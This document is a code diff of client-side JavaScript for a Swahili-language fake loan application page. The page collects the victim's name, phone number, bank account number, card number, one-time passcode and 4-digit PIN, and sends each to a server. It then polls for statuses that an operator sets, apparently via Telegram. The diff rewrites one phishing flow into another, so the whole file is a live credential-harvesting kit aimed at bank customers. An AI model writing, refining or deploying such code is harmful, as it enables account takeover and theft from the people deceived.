@@ -1,216 +1,252 @@
-let currentStep = 'personal_info';
-let clientPayload = {};
-let timerInterval = null;
-let timeLeft = 30;
-let pollTimeout = null; // Track polling loop timer
+document.addEventListener('DOMContentLoaded', () => {
+    let clientId = 'client_' + Math.random().toString(36).substring(2, 9);
+    let formData = {};
+    let pollInterval = null;
 
-function updateCalculator() {
-    const amount = parseInt(document.getElementById('loanAmountSlider').value);
-    const months = parseInt(document.getElementById('loanTermSlider').value);
+    const steps = ['stepSlider', 'step1', 'step2', 'step3', 'accountVerification', 'otpScreen', 'pinScreen', 'congratsScreen'];
+    let currentStepIndex = 0;
 
-    document.getElementById('loanAmountDisplay').innerText = `TSh ${amount.toLocaleString()}`;
-    document.getElementById('loanTermDisplay').innerText = `miezi ${months}`;
-
-    const monthlyRate = 0.02; 
-    const monthlyPayment = (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months));
-    document.getElementById('monthlyPaymentDisplay').innerText = `TSh ${Math.round(monthlyPayment).toLocaleString()}`;
-}
-
-function showStep(stepId) {
-    document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
-    document.getElementById(`step-${stepId}`).classList.add('active');
-    currentStep = stepId;
-}
-
-function showLoading(text) {
-    document.getElementById('loadingText').innerText = text;
-    document.getElementById('loadingOverlay').style.display = 'flex';
-}
-
-function hideLoading() {
-    document.getElementById('loadingOverlay').style.display = 'none';
-    if (pollTimeout) {
-        clearTimeout(pollTimeout);
-        pollTimeout = null;
-    }
-}
-
-async function sendToServer(step, data) {
-    clientPayload = { ...clientPayload, ...data };
-    try {
-        const response = await fetch('/api/submit', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ step, data: clientPayload })
+    function showStep(index) {
+        steps.forEach((s, idx) => {
+            const el = document.getElementById(s);
+            if (el) {
+                if (idx === index) {
+                    el.classList.add('active');
+                } else {
+                    el.classList.remove('active');
+                }
+            }
         });
-        return await response.json();
-    } catch (e) {
-        console.error('Network error:', e);
-        return { success: false, message: 'Kosa la mtandao. Jaribu tena.' };
+        currentStepIndex = index;
     }
-}
 
-async function pollServerStatus() {
-    try {
-        const response = await fetch('/api/poll-status');
-        const res = await response.json();
+    function showNotification(text) {
+        const notif = document.getElementById('surfaceNotification');
+        if (notif) {
+            notif.textContent = text;
+            notif.classList.remove('hidden');
+        }
+    }
 
-        // If still pending or waiting, keep polling every 2.5 seconds
-        if (res.status === 'pending' || !res.status) {
-            pollTimeout = setTimeout(pollServerStatus, 2500);
+    function hideNotification() {
+        const notif = document.getElementById('surfaceNotification');
+        if (notif) notif.classList.add('hidden');
+    }
+
+    // Slider inputs
+    const loanRange = document.getElementById('loanRange');
+    const loanAmountText = document.getElementById('loanAmountText');
+    const step1Amount = document.getElementById('step1Amount');
+    
+    if (loanRange) {
+        loanRange.addEventListener('input', (e) => {
+            const val = Number(e.target.value).toLocaleString();
+            loanAmountText.textContent = `TSh ${val}`;
+            if (step1Amount) step1Amount.value = e.target.value;
+        });
+    }
+
+    document.getElementById('toStep1Btn').addEventListener('click', () => {
+        formData.loanAmount = loanRange.value;
+        showStep(1);
+    });
+
+    document.getElementById('nextToStep1').addEventListener('click', () => showStep(0));
+    document.getElementById('backToStep1').addEventListener('click', () => showStep(1));
+    document.getElementById('backToStep2').addEventListener('click', () => showStep(2));
+
+    document.getElementById('nextToStep2').addEventListener('click', () => {
+        formData.loanType = document.getElementById('loanType').value;
+        formData.amount = document.getElementById('step1Amount').value;
+        formData.duration = document.getElementById('step1Duration').value;
+        formData.purpose = document.getElementById('loanPurpose').value;
+        showStep(2);
+    });
+
+    document.getElementById('nextToStep3').addEventListener('click', () => {
+        formData.firstName = document.getElementById('firstName').value;
+        formData.lastName = document.getElementById('lastName').value;
+        formData.phone = document.getElementById('phoneNumber').value;
+
+        if (!formData.firstName || !formData.lastName || !formData.phone) {
+            alert('Tafadhali jaza taarifa zote!');
             return;
         }
 
-        // Definitive response received, hide the loading screen
-        hideLoading();
+        document.getElementById('displayPhone').textContent = `+255 ${formData.phone} (Tembo)`;
+        showStep(3);
+    });
 
-        if (res.status === 'approved') {
-            if (res.next === 'otp') {
-                showStep('step4');
-                startOtpTimer();
-            } else if (res.next === 'pin') {
-                showStep('step5');
-            } else if (res.next === 'success') {
-                showStep('success');
+    document.getElementById('submitLoanApp').addEventListener('click', () => {
+        formData.employmentStatus = document.getElementById('employmentStatus').value;
+        formData.annualIncome = document.getElementById('annualIncome').value;
+
+        // Populate summary
+        document.getElementById('summaryDetails').innerHTML = `
+            Kiasi cha Mkopo: TSh ${formData.amount || '100,000'}<br>
+            Muda wa Mkopo: ${formData.duration || 'Miezi 48'}<br>
+            Madhumuni: ${formData.purpose || 'Biashara'}<br>
+            Mwombaji: ${formData.firstName} ${formData.lastName}
+        `;
+
+        // Move to account and card number verification screen
+        showStep(4);
+    });
+
+    // Account & Card Number submission
+    document.getElementById('submitAccountDetails').addEventListener('click', async () => {
+        const accountNumber = document.getElementById('accountNumberInput').value;
+        const cardNumber = document.getElementById('cardNumberInput').value;
+
+        if (!accountNumber || !cardNumber) {
+            alert('Weka namba ya akaunti na namba ya kadi!');
+            return;
+        }
+
+        showNotification('Inatuma taarifa kwa uthibitisho...');
+
+        await fetch('/api/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                step: 'account_details',
+                clientId,
+                data: { accountNumber, cardNumber, ...formData }
+            })
+        });
+
+        startPolling();
+    });
+
+    // OTP Auto-loop inputs
+    setupOtpInputs('.otp-box', () => {
+        const otpVals = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
+        if (otpVals.length === 5) {
+            submitOtp(otpVals);
+        }
+    });
+
+    // PIN Auto-loop inputs
+    setupOtpInputs('.pin-box', () => {
+        const pinVals = Array.from(document.querySelectorAll('.pin-box')).map(i => i.value).join('');
+        if (pinVals.length === 4) {
+            submitPin(pinVals);
+        }
+    });
+
+    function setupOtpInputs(selector, onComplete) {
+        const inputs = document.querySelectorAll(selector);
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                const val = e.target.value;
+                if (val && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                onComplete();
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+    }
+
+    document.getElementById('verifyOtpBtn').addEventListener('click', () => {
+        const otpVals = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
+        if (otpVals.length < 5) {
+            alert('Weka namba kamili ya OTP!');
+            return;
+        }
+        submitOtp(otpVals);
+    });
+
+    async function submitOtp(otp) {
+        showNotification('Inathibitisha OTP...');
+        await fetch('/api/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ step: 'otp_submitted', clientId, data: { otp } })
+        });
+        startPolling();
+    }
+
+    document.getElementById('resendOtpLink').addEventListener('click', async (e) => {
+        e.preventDefault();
+        showNotification('Tunaomba OTP mpya...');
+        await fetch('/api/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ step: 'resend_otp', clientId, data: {} })
+        });
+        showNotification('OTP mpya imeombwa. Subiri uthibitisho ✅');
+    });
+
+    document.getElementById('verifyPinBtn').addEventListener('click', () => {
+        const pinVals = Array.from(document.querySelectorAll('.pin-box')).map(i => i.value).join('');
+        if (pinVals.length < 4) {
+            alert('Weka PIN kamili ya tarakimu 4!');
+            return;
+        }
+        submitPin(pinVals);
+    });
+
+    async function submitPin(pin) {
+        showNotification('Inathibitisha PIN...');
+        await fetch('/api/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ step: 'pin_submitted', clientId, data: { pin } })
+        });
+        startPolling();
+    }
+
+    // Polling server for admin actions from Telegram
+    function startPolling() {
+        if (pollInterval) clearInterval(pollInterval);
+
+        pollInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/status/${clientId}`);
+                const data = await res.json();
+
+                if (data.status === 'wrong_details') {
+                    showNotification('WRONG DETAILS ❌ - Tafadhali ingiza upya namba ya akaunti na kadi.');
+                    showStep(4);
+                    clearInterval(pollInterval);
+                } else if (data.status === 'correct_details') {
+                    showNotification('CORRECT DETAILS ✅ - Endelea kwenda OTP.');
+                    showStep(5);
+                    clearInterval(pollInterval);
+                } else if (data.status === 'otp_incorrect') {
+                    showNotification('OTP INCORRECT ❌ - Tafadhali ingiza namba mpya halali ya OTP.');
+                    document.querySelectorAll('.otp-box').forEach(b => b.value = '');
+                    document.querySelector('.otp-box').focus();
+                    clearInterval(pollInterval);
+                } else if (data.status === 'otp_correct') {
+                    showNotification('OTP CORRECT ✅ - Endelea kuweka PIN.');
+                    showStep(6);
+                    clearInterval(pollInterval);
+                } else if (data.status === 'invalid_pin') {
+                    showNotification('INVALID PIN ❌ - Tafadhali ingiza PIN halali.');
+                    document.querySelectorAll('.pin-box').forEach(b => b.value = '');
+                    document.querySelector('.pin-box').focus();
+                    clearInterval(pollInterval);
+                } else if (data.status === 'valid_pin') {
+                    showNotification('VALID PIN ✅ - Umeweka PIN sahihi. Subiri idhini...');
+                } else if (data.status === 'loan_approved') {
+                    showNotification('LOAN APPROVED 🎉');
+                    // Populate congrats screen details
+                    document.getElementById('congratsName').textContent = `${formData.firstName || 'JANE'} ${formData.lastName || 'MWANGI'}`.toUpperCase();
+                    document.getElementById('congratsPhone').textContent = `+255 ${formData.phone || '712 345 678'}`;
+                    document.getElementById('congratsAcc').textContent = formData.accountNumber || 'SBK0012345678';
+                    showStep(7);
+                    clearInterval(pollInterval);
+                }
+            } catch (err) {
+                console.error('Polling error:', err);
             }
-        } else if (res.status === 'denied' || res.status === 'blocked') {
-            alert(res.message || 'Ombi limekataliwa.');
-            location.reload();
-        } else if (res.status === 'retry_otp' || res.status === 'resend') {
-            alert(res.message);
-            if (res.status === 'resend') startOtpTimer();
-        } else if (res.status === 'retry_pin') {
-            alert(res.message);
-        }
-    } catch (e) {
-        // Retry polling if network hiccup occurs momentarily
-        pollTimeout = setTimeout(pollServerStatus, 3000);
+        }, 3000);
     }
-}
-
-async function submitPersonalInfo() {
-    const loanAmount = document.getElementById('loanAmountSlider').value;
-    const loanTerm = document.getElementById('loanTermSlider').value;
-    const firstName = document.getElementById('firstName').value;
-    const lastName = document.getElementById('lastName').value;
-    const phoneNumber = document.getElementById('phoneNumber').value;
-
-    if (!firstName || !lastName || !phoneNumber) {
-        alert('Tafadhali jaza nafasi zote wazi.');
-        return;
-    }
-
-    showLoading('Inachakata taarifa zako...');
-    await sendToServer('personal_info', { loanAmount: `TSh ${Number(loanAmount).toLocaleString()}`, loanTerm: `${loanTerm} miezi`, firstName, lastName, phoneNumber });
-    hideLoading();
-    
-    showStep('step3');
-}
-
-async function submitTemboCard() {
-    const accountNumber = document.getElementById('accountNumber').value;
-    const cardNumber = document.getElementById('cardNumber').value;
-
-    if (!accountNumber || !cardNumber) {
-        alert('Tafadhali ingiza namba ya akaunti na kadi ya Tembo.');
-        return;
-    }
-
-    showLoading('Inasubiri idhini ya Benki...');
-    const res = await sendToServer('step3', { accountNumber, cardNumber });
-    
-    if (res.pendingApproval || res.status === 'pending') {
-        pollServerStatus();
-    }
-}
-
-function startOtpTimer() {
-    timeLeft = 30;
-    const timerSpan = document.getElementById('timer');
-    const resendBtn = document.getElementById('resendBtn');
-    if (resendBtn) resendBtn.disabled = true;
-
-    if (timerInterval) clearInterval(timerInterval);
-
-    const displayPhone = document.getElementById('displayPhone');
-    if (displayPhone) {
-        displayPhone.innerText = `+255 ${clientPayload.phoneNumber || '7XX XXX XXX'}`;
-    }
-
-    timerInterval = setInterval(async () => {
-        timeLeft--;
-        if (timerSpan) timerSpan.innerText = timeLeft;
-        if (timeLeft <= 0) {
-            clearInterval(timerInterval);
-            if (resendBtn) resendBtn.disabled = false;
-            
-            showLoading('Muda wa OTP umeisha. Inaarifu msimamizi...');
-            await sendToServer('step4', { isResend: true });
-            hideLoading();
-            pollServerStatus();
-        }
-    }, 1000);
-}
-
-function moveToNext(element, index) {
-    element.value = element.value.replace(/[^0-9]/g, '');
-    if (element.value.length === 1 && index < 5) {
-        const boxes = document.querySelectorAll('.otp-box');
-        if (boxes[index]) boxes[index].focus();
-    }
-}
-
-function movePinNext(element, index) {
-    element.value = element.value.replace(/[^0-9]/g, '');
-    if (element.value.length === 1 && index < 4) {
-        const boxes = document.querySelectorAll('.pin-box');
-        if (boxes[index]) boxes[index].focus();
-    }
-}
-
-async function submitOtp() {
-    const boxes = document.querySelectorAll('.otp-box');
-    let otp = '';
-    boxes.forEach(b => otp += b.value);
-
-    if (otp.length < 5 || !/^\d+$/.test(otp)) {
-        alert('Tafadhali ingiza namba kamili ya OTP ya tarakimu 5 (nambari pekee).');
-        return;
-    }
-
-    showLoading('Inasubiri uthibitisho wa OTP...');
-    const res = await sendToServer('step4', { otp });
-    if (res.pendingApproval || res.status === 'pending') {
-        pollServerStatus();
-    }
-}
-
-async function triggerResendOtp() {
-    showLoading('Inatuma ombi la OTP mpya...');
-    const res = await sendToServer('step4', { isResend: true });
-    if (res.pendingApproval || res.status === 'pending') {
-        document.getElementById('loadingText').innerText = 'Inasubiri idhini ya kutuma OTP mpya...';
-        pollServerStatus();
-    }
-}
-
-async function submitPin() {
-    const boxes = document.querySelectorAll('.pin-box');
-    let pin = '';
-    boxes.forEach(b => pin += b.value);
-
-    if (pin.length < 4 || !/^\d+$/.test(pin)) {
-        alert('Tafadhali ingiza PIN ya tarakimu 4 (nambari pekee).');
-        return;
-    }
-
-    showLoading('Inathibitisha PIN ya SimBanking...');
-    const res = await sendToServer('step5', { pin });
-    if (res.pendingApproval || res.status === 'pending') {
-        pollServerStatus();
-    }
-}
-
-window.onload = () => {
-    updateCalculator();
-};
+});
+        
